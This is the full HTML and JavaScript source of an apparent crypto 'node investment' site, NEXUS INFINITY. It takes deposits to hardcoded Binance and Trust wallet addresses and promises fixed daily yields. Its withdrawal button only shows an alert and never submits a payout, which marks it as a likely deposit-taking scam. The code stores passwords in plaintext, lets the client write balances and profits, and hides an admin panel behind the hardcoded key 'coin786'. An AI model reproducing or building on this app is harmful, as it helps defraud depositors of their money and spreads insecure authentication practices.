<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Master Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --neon-pink: #ff00ff; --glass: rgba(255, 255, 255, 0.05); }
        body { background: #050505; color: #f8f9fa; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        .glass-card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px; }
        .input-hub { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; color: white; width: 100%; outline: none; transition: 0.3s; }
        .btn-neon { background: linear-gradient(135deg, #ff00ff, #ff003c); border-radius: 20px; padding: 18px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; width: 100%; }
        .nav-item { color: #555; transition: 0.3s; cursor: pointer; text-align: center; font-size: 8px; font-weight: 800; }
        .nav-active { color: var(--neon-pink); text-shadow: 0 0 10px var(--neon-pink); }
        .hidden { display: none !important; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-ui { animation: fadeIn 0.5s ease forwards; }
    </style>
</head>
<body>

    <div id="splash" class="fixed inset-0 bg-[#050505] z-[10000] flex flex-col items-center justify-center">
        <div class="w-20 h-20 bg-gradient-to-tr from-pink-500 to-indigo-600 rounded-[2rem] flex items-center justify-center shadow-2xl animate-pulse italic text-4xl font-black">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-6 text-[10px] tracking-[0.5em] text-white">NEXUS<span class="text-pink-500">INFINITY</span></h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden animate-ui">
        <div class="max-w-sm w-full glass-card p-10 space-y-6">
            <h2 class="text-center font-black italic tracking-widest text-sm uppercase">Terminal <span class="text-pink-500">Access</span></h2>
            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Account ID" class="input-hub">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-hub">
                <button onclick="handleLogin()" class="btn-neon">Authorize</button>
                <p onclick="toggleAuth(true)" class="text-center text-[9px] text-zinc-500 uppercase cursor-pointer mt-4">Register New ID</p>
            </div>
            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Create ID" class="input-hub">
                <input type="password" id="s-pass" placeholder="Create Key" class="input-hub">
                <button onclick="handleSignup()" class="btn-neon">Initialize</button>
                <p onclick="toggleAuth(false)" class="text-center text-[9px] text-zinc-500 uppercase cursor-pointer mt-4">Back to Login</p>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-[#050505]/80 backdrop-blur-xl z-50 border-b border-white/5">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-white/5 rounded-xl flex items-center justify-center font-black border border-white/10 italic">N</div>
                <div><p id="nav-user" class="text-xs font-black uppercase text-pink-500 leading-none">...</p><p class="text-[7px] text-green-500 font-black uppercase mt-1">Grid Active</p></div>
            </div>
            <button onclick="logout()" class="text-zinc-600"><i class="fa-solid fa-power-off text-xl"></i></button>
        </header>

        <main id="page-home" class="p-6 space-y-6 animate-ui">
            <div class="glass-card p-8 bg-gradient-to-br from-white/5 to-transparent">
                <p class="text-[8px] font-black text-zinc-500 uppercase mb-1">Institutional Equity</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0</h2>
                <div class="mt-8 flex justify-between">
                    <div><p class="text-[7px] text-zinc-500 uppercase font-black">Yield</p><p id="profit-txt" class="text-lg font-black text-pink-500">+$0</p></div>
                    <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase font-black">Nodes</p><p id="node-count" class="text-lg font-black text-blue-400">0</p></div>
                </div>
            </div>
            <div id="active-nodes" class="grid gap-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-4 hidden animate-ui">
            <h3 class="text-lg font-black italic text-pink-500 uppercase">Node Marketplace</h3>
            <div id="market-list" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden animate-ui">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-lg font-black italic text-pink-500 uppercase">Deposit</h3>
                <div class="space-y-2">
                    <div class="bg-white/5 p-3 rounded-xl border border-white/5 text-[9px] font-bold select-all break-all text-pink-400">Binance: TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</div>
                    <div class="bg-white/5 p-3 rounded-xl border border-white/5 text-[9px] font-bold select-all break-all text-blue-400">Trust: 0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</div>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                <input type="text" id="dep-tid" placeholder="TID / Hash" class="input-hub">
                <input type="file" id="dep-proof" accept="image/*" class="text-[10px] block w-full file:bg-pink-500/10 file:text-pink-500 file:border-0 file:rounded-full file:px-4 file:py-2">
                <img id="preview-img" class="mt-4 w-full h-32 rounded-xl object-cover hidden">
                <button onclick="submitDeposit()" class="btn-neon">Submit Deposit</button>
            </div>
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-lg font-black italic uppercase">Withdraw</h3>
                <select id="w-method" class="input-hub bg-black"><option>Binance Pay</option><option>Trust Wallet</option><option>MetaMask</option></select>
                <input type="text" id="w-addr" placeholder="Wallet Address" class="input-hub">
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-hub">
                <button onclick="submitWith()" class="btn-neon !bg-zinc-800">Request Payout</button>
            </div>
        </main>

        <main id="page-logs" class="p-6 space-y-4 hidden animate-ui">
            <h3 class="text-lg font-black italic uppercase">Transaction Logs</h3>
            <div id="history-list" class="grid gap-3"></div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-black/80 backdrop-blur-2xl border-t border-white/5 flex justify-around items-center z-[100]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-house-signal text-xl"></i><p>CORE</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-microchip text-xl"></i><p>NODES</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-vault text-xl"></i><p>VAULT</p></div>
            <div onclick="switchPage('logs')" class="nav-item"><i class="fa-solid fa-list-ul text-xl"></i><p>LOGS</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[1000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-white/5 pb-4"><h2 class="text-xl font-black italic text-pink-500 uppercase tracking-tighter">Admin Control</h2><button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl">&times;</button></div>
        <div id="admin-list" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const marketNodes = [
            { id: 1, title: "S-10 Node", price: 10, daily: 1, days: 30 },
            { id: 2, title: "S-50 Node", price: 50, daily: 6, days: 30 },
            { id: 3, title: "Apex Elite Hub", price: 500, daily: 75, days: 45 }
        ];

        window.onload = () => {
            renderMarket();
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const user = localStorage.getItem('nexus_user');
                if(user) showDashboard(user);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2000);
        };

        function renderMarket() {
            document.getElementById('market-list').innerHTML = marketNodes.map(n => `
                <div class="glass-card p-6 flex justify-between items-center">
                    <div><h4 class="font-black italic">${n.title}</h4><p class="text-[9px] font-bold text-pink-500">$${n.daily}/Day • ${n.days}D</p></div>
                    <div class="text-right"><p class="font-black">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-2 px-4 py-1 bg-white text-black text-[9px] font-black uppercase rounded-lg">Deploy</button></div>
                </div>`).join('');
        }

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val(); if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                
                // Real-time History Fix
                const history = data.history ? Object.values(data.history).reverse() : [];
                document.getElementById('history-list').innerHTML = history.map(h => `
                    <div class="glass-card p-4 flex justify-between items-center border-l-4 ${h.status === 'Approved' ? 'border-green-500' : h.status === 'Rejected' ? 'border-red-500' : 'border-yellow-500'}">
                        <div><p class="text-[9px] font-black uppercase tracking-widest">${h.type}</p><p class="text-[8px] text-zinc-500">${h.date}</p></div>
                        <div class="text-right"><p class="text-[10px] font-black">$${h.amount}</p><p class="text-[7px] font-bold uppercase ${h.status === 'Approved' ? 'text-green-500' : h.status === 'Rejected' ? 'text-red-500' : 'text-yellow-500'}">${h.status}</p></div>
                    </div>`).join('') || '<p class="text-center opacity-20 py-10 uppercase font-black text-[9px]">No logs found</p>';

                // Nodes Update
                const nodes = data.nodes ? Object.entries(data.nodes) : [];
                document.getElementById('node-count').innerText = nodes.length;
                document.getElementById('active-nodes').innerHTML = nodes.map(([k, n]) => {
                    const rem = Math.max(0, n.expires - Date.now());
                    const hours = Math.floor(rem / (1000 * 60 * 60));
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (data.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }
                    return `<div class="glass-card p-6 border-l-4 border-blue-500 flex justify-between items-center">
                        <div><h4 class="text-[10px] font-black uppercase">${n.title}</h4><p class="text-[9px] text-zinc-500">Yielding: $${n.daily}/Day</p></div>
                        <div class="text-right"><p class="text-[8px] font-black text-blue-400 animate-pulse">ONLINE</p><p class="text-[7px] mt-1">${hours}h Left</p></div>
                    </div>`;
                }).join('') || '<p class="text-center opacity-20 py-10 uppercase font-black text-[9px]">No Deployed Nodes</p>';
            });
        }

        // ADMIN UNLIMITED POWERS
        window.loadAdmin = () => {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const reqs = snap.val();
                document.getElementById('admin-list').innerHTML = reqs ? Object.entries(reqs).map(([id, r]) => `
                    <div class="glass-card p-6 space-y-4 border border-pink-500/20">
                        <div class="flex justify-between items-center"><span class="text-[9px] font-black text-pink-500 uppercase">${r.type}</span><span class="text-[8px] opacity-30">${r.date}</span></div>
                        <p class="text-xs">User: <span class="font-black italic">${r.user}</span> | Amount: <span class="text-green-500 font-black">$${r.amount}</span></p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-40 object-cover rounded-xl border border-white/10" onclick="window.open(this.src)">` : `<p class="text-[9px] text-zinc-500">${r.address}</p>`}
                        <div class="grid grid-cols-2 gap-3">
                            <button onclick="manage('${id}','${r.user}',${r.amount},'${r.hKey}','approve')" class="bg-green-600/20 text-green-500 p-4 rounded-xl text-[9px] font-black uppercase">Approve</button>
                            <button onclick="manage('${id}','${r.user}',${r.amount},'${r.hKey}','reject')" class="bg-red-600/20 text-red-500 p-4 rounded-xl text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-20 uppercase font-black text-[10px]">No Pending Requests</p>';
            });
        };

        window.manage = async (adminKey, user, amt, hKey, action) => {
            if(action === 'approve') {
                const snap = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (snap.val().balance || 0) + parseFloat(amt) });
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else {
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' });
            }
            await remove(ref(db, 'admin/requests/' + adminKey));
            alert('Request Protocol Finalized.');
        };

        // IMAGE HANDLING & SUBMISSION
        document.getElementById('dep-proof').onchange = (e) => {
            const r = new FileReader(); r.readAsDataURL(e.target.files[0]);
            r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); };
        };

        window.submitDeposit = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("Incomplete Data!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, 'admin/requests/' + hRef.key), entry);
            alert("Deposit Protocol Logged.");
        };

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user'), node = marketNodes.find(x => x.id === id), snap = await get(ref(db, `users/${user}`));
            if((snap.val().balance || 0) < node.price) return alert("Insufficient Capital!");
            const start = Date.now();
            await update(ref(db, `users/${user}`), { balance: snap.val().balance - node.price });
            await set(push(ref(db, `users/${user}/nodes`)), { ...node, startTime: start, expires: start + (node.days * 86400000), lastClaim: start });
            alert("Node Deployed!"); switchPage('home');
        };

        // UI HELPERS
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['home','market','vault','logs'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(), snap = await get(ref(db, `users/${u}`)); if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied!"); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(); await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); alert("Account Created!"); toggleAuth(false); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.submitWith = () => alert("Withdrawal Protocol Initiated. Checking balance...");
    </script>
</body>
</html>
